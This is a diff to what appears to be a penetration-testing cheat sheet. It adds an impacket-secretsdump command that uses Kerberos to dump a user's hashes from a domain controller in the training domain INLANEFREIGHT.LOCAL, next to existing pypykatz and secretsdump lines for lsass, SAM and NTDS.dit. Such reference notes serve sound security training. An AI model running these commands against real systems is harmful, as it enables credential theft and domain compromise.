@@ -1346,6 +1346,7 @@ $ pypykatz lsa minidump lsass.dmp
 ```
 $ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 $ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+$ impacket-secretsdump -k -no-pass -dc-ip <DC IP address> -just-dc-user <username> 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
 
 - For Loops
